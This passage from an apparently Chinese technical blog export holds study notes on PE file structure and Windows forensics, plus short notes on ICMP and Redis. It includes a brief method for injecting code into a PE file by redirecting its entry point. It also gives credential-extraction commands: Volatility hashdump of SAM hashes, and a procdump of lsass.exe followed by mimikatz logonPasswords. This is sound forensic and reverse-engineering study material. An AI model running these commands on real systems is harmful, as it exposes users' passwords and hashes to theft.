可执行文件</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可选 PE 头：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0x00</span> WORD Magic;                    <span class="comment">//※幻数(魔数)，0x0107:ROM image,0x010B:32位PE，0X020B:64位PE </span></span><br><span class="line">    <span class="comment">//0x02 BYTE MajorLinkerVersion;     //连接器主版本号</span></span><br><span class="line">    <span class="comment">//0x03 BYTE MinorLinkerVersion;     //连接器副版本号</span></span><br><span class="line">    <span class="number">0x04</span> DWORD SizeOfCode;              <span class="comment">//所有代码段的总和大小,注意：必须是FileAlignment的整数倍,存在但没用</span></span><br><span class="line">    <span class="number">0x08</span> DWORD SizeOfInitializedData;   <span class="comment">//已经初始化数据的大小,注意：必须是FileAlignment的整数倍,存在但没用</span></span><br><span class="line">    <span class="number">0x0c</span> DWORD SizeOfUninitializedData; <span class="comment">//未经初始化数据的大小,注意：必须是FileAlignment的整数倍,存在但没用</span></span><br><span class="line">    <span class="number">0x10</span> DWORD AddressOfEntryPoint;     <span class="comment">//※程序入口地址OEP，这是一个RVA(Relative Virtual Address),通常会落在.textsection,此字段对于DLLs/EXEs都适用。</span></span><br><span class="line">    <span class="number">0x14</span> DWORD BaseOfCode;              <span class="comment">//代码段起始地址(代码基址),(代码的开始和程序无必然联系)</span></span><br><span class="line">    <span class="number">0x18</span> DWORD BaseOfData;              <span class="comment">//数据段起始地址(数据基址)</span></span><br><span class="line">    <span class="number">0x1c</span> DWORD ImageBase;               <span class="comment">//※内存镜像基址(默认装入起始地址),默认为4000H</span></span><br><span class="line">    <span class="number">0x20</span> DWORD SectionAlignment;        <span class="comment">//※内存对齐:一旦映像到内存中，每一个section保证从一个「此值之倍数」的虚拟地址开始</span></span><br><span class="line">    <span class="number">0x24</span> DWORD FileAlignment;           <span class="comment">//※文件对齐：最初是200H，现在是1000H</span></span><br><span class="line">    <span class="comment">//0x28 WORD MajorOperatingSystemVersion;    //所需操作系统主版本号</span></span><br><span class="line">    <span class="comment">//0x2a WORD MinorOperatingSystemVersion;    //所需操作系统副版本号</span></span><br><span class="line">    <span class="comment">//0x2c WORD MajorImageVersion;              //自定义主版本号,使用连接器的参数设置,eg:LINK /VERSION:2.0 myobj.obj</span></span><br><span class="line">    <span class="comment">//0x2e WORD MinorImageVersion;              //自定义副版本号,使用连接器的参数设置</span></span><br><span class="line">    <span class="comment">//0x30 WORD MajorSubsystemVersion;          //所需子系统主版本号,典型数值4.0(Windows 4.0/即Windows 95)</span></span><br><span class="line">    <span class="comment">//0x32 WORD MinorSubsystemVersion;          //所需子系统副版本号</span></span><br><span class="line">    <span class="comment">//0x34 DWORD Win32VersionValue;             //总是0</span></span><br><span class="line">    <span class="number">0x38</span> DWORD SizeOfImage;         <span class="comment">//※PE文件在内存中映像总大小,sizeof(ImageBuffer),SectionAlignment的倍数</span></span><br><span class="line">    <span class="number">0x3c</span> DWORD SizeOfHeaders;       <span class="comment">//※DOS头(64B)+PE标记(4B)+标准PE头(20B)+可选PE头+节表的总大小，按照文件对齐(FileAlignment的倍数)</span></span><br><span class="line">    <span class="number">0x40</span> DWORD CheckSum;            <span class="comment">//PE文件CRC校验和，判断文件是否被修改</span></span><br><span class="line">    <span class="comment">//0x44 WORD Subsystem;          //用户界面使用的子系统类型</span></span><br><span class="line">    <span class="comment">//0x46 WORD DllCharacteristics;   //总是0</span></span><br><span class="line">    <span class="number">0x48</span> DWORD SizeOfStackReserve;  <span class="comment">//默认线程初始化栈的保留大小</span></span><br><span class="line">    <span class="number">0x4c</span> DWORD SizeOfStackCommit;   <span class="comment">//初始化时实际提交的线程栈大小</span></span><br><span class="line">    <span class="number">0x50</span> DWORD SizeOfHeapReserve;   <span class="comment">//默认保留给初始化的process heap的虚拟内存大小</span></span><br><span class="line">    <span class="number">0x54</span> DWORD SizeOfHeapCommit;    <span class="comment">//初始化时实际提交的process heap大小</span></span><br><span class="line">    <span class="comment">//0x58 DWORD LoaderFlags;       //总是0</span></span><br><span class="line">    <span class="number">0x5c</span> DWORD NumberOfRvaAndSizes; <span class="comment">//目录项数目：总为0X00000010H(16)</span></span><br><span class="line">    <span class="number">0x60</span> _IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">//#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>DataDictionary:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span>&#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//占用16*8 = 128Byte = 80H = E0H(可选PE头默认大小) - 60H(前面所有成员固定占用大小)</span></span><br></pre></td></tr></table></figure>

<p>节表：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span>&#123;</span></span><br><span class="line">    BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 8个字节的节区名称</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">Misc</span>&#123;</span></span><br><span class="line">        DWORD PhysicalAddress;       </span><br><span class="line">        DWORD VirtualSize;            <span class="comment">//节区的尺寸</span></span><br><span class="line">    &#125;</span><br><span class="line">    DWORD VirtualAddress;         <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">    DWORD SizeOfRawData;            <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD PointerToRawData;        <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">    DWORD PointerToRelocations;     <span class="comment">// 在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD PointerToLinenumbers;   <span class="comment">// 行号表的偏移（供调试使用地）</span></span><br><span class="line">    WORD NumberOfRelocations;      <span class="comment">// 在OBJ文件中使用，重定位项数目</span></span><br><span class="line">    WORD NumberOfLinenumbers;    <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">    DWORD Characteristics;       <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<h3 id="空白区加代码"><a href="#空白区加代码" class="headerlink" title="空白区加代码"></a>空白区加代码</h3><ol>
<li>找到 MessageBoxA 函数。</li>
<li>在可选PE头中找到OEP，修改。</li>
<li>采用硬编码编写。<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">CALL</span> <span class="comment">; OEP 指向这里 ; E8 XX XX XX XX</span></span><br><span class="line"><span class="keyword">JMP</span>  <span class="comment">; OEP 原来的值 ; E9 XX XX XX XX 这个X的值是 要跳转的地址与此条指令的下一条指令地址之间的差</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="节"><a href="#节" class="headerlink" title="节"></a>节</h3><p>当要修改节的内容或新增节时（都是修改拉伸后的内容）：</p>
<ol>
<li>分配空间。（SizeOfImage）</li>
<li>复制头部：DOS, PE, Option PE, 节表。（SizeOfHeaders）</li>
<li>确定每一节的大小。（VirtualSize，SizeOfRawData，SizeOfImage）</li>
<li>确定节的位置。（PointToRawData，VirtualAddress）</li>
<li>修改代码时注意偏移。（ImageBase）</li>
<li>新加入一节，需要在节表中新增条目，修改PE头中节数量，以及SizeOfImage。</li>
<li>节表新加入节条目后，后面需要补一个全零的条目。（40个字节）</li>
<li>当扩大最后一节时，需要修改SizeOfRawData，VirtualSize，SizeOfImage。</li>
<li>当合并节时，需要修改节表。（SizeOfHeaders，SizeOfRawData，VirtualSize，PointToRawData）</li>
</ol>
<p>注意：</p>
<ol>
<li>SizeOfHeaders不可以随便变，一旦改变，下面所有的地址都需要变。</li>
<li>如果节表空间不够，则将NT头网上移动，占据DOS STUB空间。</li>
<li>一旦节表空间不足，DOS STUB空间不足等情况发生，则扩大最后一个节添加数据。</li>
<li>有时节表的后面不一定是空闲空间，也可能是有用数据，就不增加节，而是直接修改现有节。</li>
</ol>
<h3 id="数据字典"><a href="#数据字典" class="headerlink" title="数据字典"></a>数据字典</h3><p>记录了16种不同的信息：<strong>导出表</strong>，<strong>导入表</strong>，资源表，异常信息表，安全证书表，<strong>重定位表</strong>，调试信息表，版权所有表，全局指针表，TLS表，加载配置表，绑定导入表，<strong>IAT表</strong>，延迟导入表，COM信息表，未使用（作为保留）。</p>
<p>Data Dictionary:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span>&#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//占用16*8 = 128Byte = 80H = E0H(可选PE头默认大小) - 60H(前面所有成员固定占用大小)</span></span><br></pre></td></tr></table></figure>

<h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><h3 id="IAT表"><a href="#IAT表" class="headerlink" title="IAT表"></a>IAT表</h3><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><p>IN OUT </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只是用来标记，没有任何作用</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUT</span></span><br></pre></td></tr></table></figure>

<p>LPVOID：等于<code>void *</code></p>
<p>LPSTR：字符串</p>
<p>FILE：文件</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LPSTR file_name = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">FILE file = fopen(file_name, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">DWORD file_size = ftell(file);</span><br><span class="line"><span class="comment">// 指针回归头部</span></span><br><span class="line">fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"><span class="comment">// 读取文件数据</span></span><br><span class="line"><span class="type">size_t</span> n = fread(buffer, file_size, <span class="number">1</span>, file);</span><br><span class="line"><span class="comment">// 关闭文件</span></span><br><span class="line">fclose(file);</span><br></pre></td></tr></table></figure>


<h1 id="Windows-API-1"><a href="#Windows-API-1" class="headerlink" title="Windows API"></a>Windows API</h1><p>参考：《Windows 黑客编程技术详解》  甘迪文。<a href="https://www.write-bug.com/">Write Bug 社区</a></p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 运行单一实例</span></span><br><span class="line"><span class="comment">//   创建一个互斥对象 </span></span><br><span class="line">CreateMutex</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL 延迟加载</span></span><br><span class="line"><span class="comment">// DLL 延迟加载信息存储在 ImgDelayDesrc 延迟导入表中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源插入</span></span><br><span class="line"><span class="comment">// MFC 中，解决方案 -&gt; 资源 -&gt; 添加资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源释放</span></span><br><span class="line"><span class="comment">//   确定模块中某类型和名称的资源所在位置，返回资源句柄</span></span><br><span class="line"><span class="built_in">FindResource</span>()</span><br><span class="line"><span class="comment">//   获取资源字节数，依据句柄获取字节数</span></span><br><span class="line"><span class="built_in">SizeofResource</span>()</span><br><span class="line"><span class="comment">//   装载资源到内存，返回资源数据的句柄</span></span><br><span class="line"><span class="built_in">LoadResource</span>()</span><br><span class="line"><span class="comment">//   锁定资源数据，返回资源第一个字节的指针</span></span><br><span class="line"><span class="built_in">LockResource</span>()</span><br><span class="line"><span class="comment">//   最后可以将数据保存到文件</span></span><br><span class="line"><span class="comment">//   资源通常存放在 PE 中 IMAGE_RESOURCE_DIRECTORY</span></span><br></pre></td></tr></table></figure>

<h3 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h3><h1 id="Windows-内核"><a href="#Windows-内核" class="headerlink" title="Windows 内核"></a>Windows 内核</h1>]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>汇编</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>网络与系统安全</title>
    <url>/2020/02/15/%E5%AE%89%E5%85%A8/Security/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h1><p>取证过程所遵循的基本原则：</p>
<ul>
<li>维护证据完整性；<ul>
<li>数字取证可以无限数量拷贝分析；</li>
<li>数字HASH可以验证数据完整性；</li>
</ul>
</li>
<li>维护监管链；<ul>
<li>数字证物原始版本写保护，使用拷贝分析；</li>
</ul>
</li>
<li>标准操作步骤；<ul>
<li>证物使用按照流程规范，即使事后证明流程有误（免责）；</li>
</ul>
</li>
<li>取证分析全部过程记录文档。</li>
</ul>
<p>考虑事项：</p>
<ul>
<li>不要破坏数据现场（实际几乎无法实现，除非是虚拟机）；</li>
<li>寄存器，CPU缓存，IO设备缓存等易失性存储器几乎无法获取；</li>
<li>系统内存是易失存储器中主要的取证对象，不修改无法获取其中数据；</li>
<li>非易失存储器通常使用完整镜像拷贝保存；</li>
<li>正常关机（会被恶意软件察觉）还是直接拔掉电源（会损坏数据）。</li>
</ul>
<p>证据搜索：数据-&gt;信息&gt;证据。</p>
<p>取证方法：</p>
<ul>
<li>活取证<ul>
<li>抓取文件metadata，创建时间线，历史命令，分析日志，哈希摘要，转存内存信息；</li>
<li>使用未受感染的干净程序取证（包括cd，ls等常用指令，甚至终端程序）</li>
<li>U盘&#x2F;网络存储收集到的证据</li>
</ul>
</li>
<li>死取证<ul>
<li>关机后制作硬盘镜像，分析镜像（MBR，GPT，LVM）</li>
</ul>
</li>
</ul>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>内存中保存着非常重要的信息。一旦内存数据被窃取，该机器上包括系统信息，系统用户，应用软件信息，应用软件缓存（如Web服务中的session等）都会被窃取。</p>
<p>内存取证工具：</p>
<ul>
<li>内存Dump工具：<a href="http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip">Dumpit</a>；</li>
<li>内存文件与内存大小接近，RAW格式。</li>
</ul>
<p>该工具可以一键保存内存转储文件到桌面，也可以存到其他位置。</p>
<p>以Windows为例：</p>
<p>分析工具 volatillity：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatillity imageinfo -f xp.raw  <span class="comment"># 信息文件，关注profile</span></span><br><span class="line">volatillity hivelist -f xp.raw --profile=WinXPSP3x86 <span class="comment"># 数据库文件</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 hivedump -o 0xe124f8a8 <span class="comment"># 按虚内存地址查看注册表内容</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span>  <span class="comment"># 用户账号</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 printkey -K <span class="string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="comment"># 最后登录的用户</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 userassist <span class="comment"># 正在运行的程序，运行多少次，最后一次运行时间等</span></span><br></pre></td></tr></table></figure>

<p>在Kali系统中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当时的进程</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 pslist</span><br><span class="line"><span class="comment"># 查看某进程内存，-D 输出到目录，-p 进程PID</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 memdump -p 1456 -D mem/</span><br><span class="line"><span class="comment"># 借助工具查看进程内存</span></span><br><span class="line">hexeditor 1456.dmp  <span class="comment"># 查看16进制数据</span></span><br><span class="line">strings 1456.dmp    <span class="comment"># 查看关键字符串，例如调用的恶意程序名</span></span><br><span class="line">strings 1456.dmp | more</span><br><span class="line">strings 1456.dmp | grep password</span><br><span class="line"><span class="comment"># 查看进程树</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 pstree</span><br><span class="line"><span class="comment"># 查看注册表蜂巢</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 hivelist</span><br><span class="line"><span class="comment"># 查看某注册表蜂巢的内容，使用相应的虚内存地址</span></span><br><span class="line"><span class="comment"># 例如查看 \SystemRoot\System32\Config\SOFTWARE 蜂巢</span></span><br><span class="line"><span class="comment"># 可以看到系统上所有注册安装的软件</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a0004a5010 </span><br><span class="line"><span class="comment"># 查看用户列表</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br><span class="line"><span class="comment"># 查看最后登录的用户</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 printkey -K <span class="string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span></span><br><span class="line"><span class="comment"># 提取用户密码哈希（查询注册表蜂巢）</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 hashdump -y system虚存地址 -s SAM虚存地址</span><br><span class="line"><span class="comment"># 查看用户行为（似乎可以追溯到几年前）</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 userassist</span><br><span class="line"><span class="comment"># 查看命令行历史</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 cmdscan</span><br><span class="line"><span class="comment"># 查看当前网络连接</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 netscan</span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 connscan</span><br><span class="line"><span class="comment"># IE历史信息</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 iehistory</span><br><span class="line"><span class="comment"># USN日志记录插件</span></span><br><span class="line"><span class="comment"># NTFS特性，用于追踪硬盘内容变化（不记录具体变更内容）</span></span><br><span class="line"><span class="comment"># 下载地址 https://raw.githubusercontent.com/tomspencer/volatillity/master/usnparser/usnparser.py</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 usnparser --output=csv --output-file=usn.csv</span><br><span class="line"><span class="comment"># 时间线插件，从多个位置收集大量用户活动，访问的进程，浏览的网页，本地文件等</span></span><br><span class="line">volatillity -f xp.raw --profile=Win7SP1x64 timeliner</span><br></pre></td></tr></table></figure>

<p>内存取证发现恶意软件简易流程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 分析内存镜像</span></span><br><span class="line">volatillity imageinfo -f xp.raw  </span><br><span class="line"><span class="comment"># 查看进程</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 pstree</span><br><span class="line"><span class="comment"># 分析网络连接情况</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 connscan</span><br><span class="line"><span class="comment"># 分析 利用PID查看SID，可多个</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 getsids -p 111,222</span><br><span class="line"><span class="comment"># 分析 DLL 调用情况</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 dlllist -p 111,222</span><br><span class="line"><span class="comment"># 查看可能的恶意程序</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 malfind -D result/</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">volatillity -f xp.raw --profile=WinXPSP3x86 malfind -p 111 -D result/</span><br><span class="line"><span class="comment"># 对可疑程序利用杀软检查</span></span><br><span class="line"><span class="comment"># 或使用网站virustital查看</span></span><br></pre></td></tr></table></figure>



<h2 id="活取证"><a href="#活取证" class="headerlink" title="活取证"></a>活取证</h2><h3 id="内存还原文字"><a href="#内存还原文字" class="headerlink" title="内存还原文字"></a>内存还原文字</h3><p>procdump工具：<a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">下载</a></p>
<p>strings工具：<a href="https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx">下载</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将当前进程内存情况存入文件</span></span><br><span class="line">procdump -ma notepad.exe notepad.dmp</span><br><span class="line"><span class="comment"># 将内存文件中的字符串提取出来</span></span><br><span class="line">strings notepad.dmp &gt; notepad.txt</span><br><span class="line"><span class="comment"># 其他文字处理文件也适用</span></span><br></pre></td></tr></table></figure>

<h3 id="内存还原图像"><a href="#内存还原图像" class="headerlink" title="内存还原图像"></a>内存还原图像</h3><p>获取内存：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将当前进程内存情况存入文件</span></span><br><span class="line">procdump -ma mspaint.exe mspaint.dmp</span><br></pre></td></tr></table></figure>

<p>进入Kali：</p>
<p>修改<code>mspaint.dmp</code>文件名为<code>mspaint.data</code>。</p>
<p>安装gimp：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install gimp</span><br></pre></td></tr></table></figure>

<p>打开gimp，选择文件类型<code>.raw</code>，打开<code>mspaint.data</code>文件，通过修改偏移与图像类型，一点点调试得到可能有图片的位置，再微调宽度得到图像。</p>
<h3 id="内存还原密码"><a href="#内存还原密码" class="headerlink" title="内存还原密码"></a>内存还原密码</h3><p>当前的用户密码明文一般存在lsass.exe进程。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">procdump -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p>打开mimikatz，输入命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>

<p>即可查看相应内容。</p>
<h2 id="死取证"><a href="#死取证" class="headerlink" title="死取证"></a>死取证</h2><h3 id="硬盘镜像"><a href="#硬盘镜像" class="headerlink" title="硬盘镜像"></a>硬盘镜像</h3><p>通过Kali光盘进入取证模式访问计算机，准备生成镜像文件。</p>
<p>打开guymager，使用两种方式查找硬盘。选择硬盘，右键，产生镜像。产生的镜像可以加入Meta信息和哈希值以防止篡改。</p>
<p>查看镜像可以用：</p>
<ul>
<li>DFF工具（digital forensics framework）。</li>
<li>Autopsy（web架构）。</li>
<li>Extundelete：适用ext3，ext4文件系统。</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">extundelete [device-file] --restore-file [restore location]</span><br></pre></td></tr></table></figure>

<ul>
<li>iPhone Backup Analyzer：只能用于分析iTunes生成的备份文件。</li>
<li>Foremost：从内测中恢复图片，支持raw，dd，iso，vmem等格式。</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">foremost -t jpeg,gif,png,doc -i 7.raw</span><br></pre></td></tr></table></figure>

<h2 id="网络取证"><a href="#网络取证" class="headerlink" title="网络取证"></a>网络取证</h2><p>可以参考《协议分析》：全流量镜像还原历史。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>网络与系统</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 笔记</title>
    <url>/2021/11/02/%E6%95%A3%E8%A3%85%E7%AC%94%E8%AE%B0/2021/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="11月2日"><a href="#11月2日" class="headerlink" title="11月2日"></a>11月2日</h1><h2 id="ICMPv4"><a href="#ICMPv4" class="headerlink" title="ICMPv4"></a>ICMPv4</h2><p>字段：Type、Code</p>
<ul>
<li>0 - Ping 应答</li>
<li>8 - Ping 请求</li>
<li>3 - 不可达<ul>
<li>0 - 网络不可达</li>
<li>1 - 主机不可达</li>
<li>2 - 协议不可达</li>
<li>3 - 端口不可达</li>
</ul>
</li>
<li>5 - 重定向，会更新路由表</li>
<li>9 - 路由通告</li>
<li>10 - 路由征求</li>
<li>11 - 超时（0 - TTL 超时）</li>
</ul>
<h2 id="ICMPv6"><a href="#ICMPv6" class="headerlink" title="ICMPv6"></a>ICMPv6</h2><ul>
<li>1 - 不可达<ul>
<li>0 - 没有目的地</li>
<li>1 - 防火墙拦截</li>
<li>2 - 超过范围（距离源地址太远）</li>
<li>3 - 地址不可达</li>
<li>4 - 端口不可达</li>
</ul>
</li>
<li>3 - 超时</li>
<li>128 - Ping请求</li>
<li>129 - Ping应答</li>
<li>130-132 - 多播</li>
<li>133-134 - 路由征求、路由通告</li>
<li>135-136 - 邻居征求、邻居通告</li>
<li>137 - 重定向</li>
<li>141-142 - 反向邻居征求、通告</li>
</ul>
<h2 id="数据链路访问"><a href="#数据链路访问" class="headerlink" title="数据链路访问"></a>数据链路访问</h2><p>BPF</p>
<p>DLPI</p>
<h2 id="P2P打洞与STUN"><a href="#P2P打洞与STUN" class="headerlink" title="P2P打洞与STUN"></a>P2P打洞与STUN</h2><p><a href="http://www.52im.net/thread-50-1-1.html">P2P技术详解(一)：NAT详解——详细原理、P2P简介-网络编程&#x2F;专项技术区 - 即时通讯开发者社区! (52im.net)</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 入门</title>
    <url>/2020/02/03/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h2><p>NoSQL是一类新出现的数据库，不支持SQL语法，也不是关系型数据库，而是基于KEY-VALUE方式存储数据。他们没有通用的语言，而是各自有各自的语法和用法。他们往往适用于关系简单，而对事务强的业务有很好的支持。</p>
<p>NoSQL数据库常见的有：</p>
<ul>
<li>Mongodb</li>
<li>Redis</li>
<li>Hadoop</li>
</ul>
<h3 id="Redis-简介"><a href="#Redis-简介" class="headerlink" title="Redis 简介"></a>Redis 简介</h3><p><a href="http://www.redis.cn/">官方网站</a><br><a href="http://doc.redisfans.com/">参考文档</a></p>
<ul>
<li>支持数据的持有化</li>
<li>不仅支持key-value，还支持list，set，zset，hash等结构。</li>
<li>支持数据备份</li>
<li>性能极高</li>
<li>拥有丰富的数据类型</li>
<li>操作都是原子性的</li>
</ul>
<p>Redis常常用来做缓存，其读写效率很高，适用于社交平台等大型系统等。</p>
<h2 id="Redis-安装与配置"><a href="#Redis-安装与配置" class="headerlink" title="Redis 安装与配置"></a>Redis 安装与配置</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>打开配置文件<code>redis.conf</code></p>
<p>bind：绑定的IP<br>port：绑定的端口<br>daemonizs：是否为守护进程（改为yes）<br>dbfilename：数据存储文件名<br>dir：存储路径<br>logfile：日志文件<br>database：数据库数量<br>slaveof：设置主从（一般不用）</p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接运行</span></span><br><span class="line">sudo redis-server /etc/redis/redis.conf</span><br><span class="line">ps -ef | grep redis <span class="comment"># 得到PID号</span></span><br><span class="line">sudo <span class="built_in">kill</span> -9  PID号</span><br><span class="line"><span class="comment"># 以服务方式运行</span></span><br><span class="line">sudo service redis start</span><br><span class="line">sudo service redis stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入redis，默认进入0号数据库</span></span><br><span class="line">redis-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># redis-cli 命令</span></span><br><span class="line">ping  <span class="comment"># ping数据库</span></span><br><span class="line"><span class="keyword">select</span> 5  <span class="comment"># 切换数据库</span></span><br></pre></td></tr></table></figure>

<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul>
<li>string：字符串，可以接受任意二进制数据，最大可容纳512MB。</li>
<li>hash：哈希，用于存储对象，包含属性、值，值的类型为string。</li>
<li>list：列表，每个元素都是string，按照插入顺序排序。</li>
<li>set：集和（无序），元素具有唯一性，且不可修改。</li>
<li>zset：有序集和，元素具有唯一性，且每个元素具有一个权重，并按照权重从小到大排序，也是没有修改操作。</li>
</ul>
